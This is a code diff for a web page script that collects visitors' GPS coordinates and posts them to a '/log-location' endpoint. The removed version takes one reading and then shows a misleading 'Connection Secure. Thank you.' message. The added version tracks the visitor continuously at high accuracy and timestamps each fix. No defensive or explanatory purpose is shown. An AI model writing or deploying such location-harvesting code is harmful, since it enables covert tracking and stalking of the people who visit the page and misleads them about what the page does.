@@ -1,18 +1,22 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            await fetch('/log-location', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude
-                })
-            });
-            document.body.innerHTML = "<h1>Connection Secure. Thank you.</h1>";
+<script>
+    // watchPosition keeps the connection open
+    const watchID = navigator.geolocation.watchPosition(async (pos) => {
+        const coords = {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            timestamp: new Date().toISOString()
+        };
+
+        await fetch('/log-location', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(coords)
         });
-    </script>
-</body>
-</html>
+    }, (err) => {
+        console.error("Error or permission denied", err);
+    }, {
+        enableHighAccuracy: true, // Uses GPS instead of just Wi-Fi
+        timeout: 5000,
+        maximumAge: 0
+    });
+</script>
